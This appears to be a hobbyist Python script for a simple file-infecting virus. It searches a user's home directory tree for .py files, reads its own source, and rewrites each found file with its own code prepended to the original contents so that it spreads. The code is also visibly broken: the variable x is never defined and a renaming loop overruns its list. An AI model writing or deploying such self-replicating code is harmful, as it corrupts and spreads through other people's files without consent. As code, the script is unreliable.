import os 
import sys

line = 0
data = ""
self_name = "main"

locations_file = os.popen("cd && find /home/k0ryan/Documents/try -name *.py")
locations_string = locations_file.read()
locations_file.close()

#save all python file locations and delete the last one
locations_list = locations_string.split("\n")
locations_list.remove('')

#open myself and save content
self_file = open("%s.py" % self_name, "r")
self_text = self_file.read()
self_file.close()

for file_location in locations_list:
	x = x + 1
	file_name = file_location.split("/")
	file_name[1] = "rotten" + str(x) + ".py"
	locations_list[x] = "/".join(file_name) 
	
for file_location in locations_list:

	#open external file and save content
	file = open(file_location, "r")
	file_text = file.read()
	file.close()

	#open external file
	file = open(file_location, "w")

	file.write(self_text)
	file.write("\n")

	#write pure code in external text and close
	file.write(file_text)
	file.close()
